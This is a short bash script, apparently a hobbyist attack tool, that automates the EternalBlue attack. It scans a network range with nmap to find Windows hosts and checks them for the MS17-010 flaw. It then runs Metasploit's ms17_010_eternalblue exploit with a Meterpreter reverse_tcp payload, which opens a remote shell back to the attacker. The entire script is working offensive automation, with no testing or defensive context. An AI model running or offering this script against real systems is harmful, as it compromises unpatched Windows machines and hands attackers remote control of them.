#!/bin/bash


read -p "Enter Your network range : " network


echo -e "\nScanning Network....\n"
sleep 5


target_ip=$(nmap -O $network -oG - | grep "Windows" | awk '{print $2}')

echo -e "Window Computer is Running at : \033[5;33m$target_ip\033[0m"


echo -e "\nScanning for Enternal Blue Exploit.....\n"
sleep 5



state=$(nmap -p445 --script smb-vuln-ms17-010 $target_ip -Pn | grep "State" | awk '{print $3}')

echo -e "The Window computer is \033[5;33m$state\033[0m "


echo -e "\n Exploiting Window Computer........"


 


# # Set the target and attacker IP addresses
# read -p "Enter Victim Window-7 IP : " target_ip


# Set the payload
payload=windows/x64/meterpreter/reverse_tcp



# Start the Metasploit console and run the EternalBlue exploit with the reverse_tcp payload
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS $target_ip; set PAYLOAD $payload; run" 
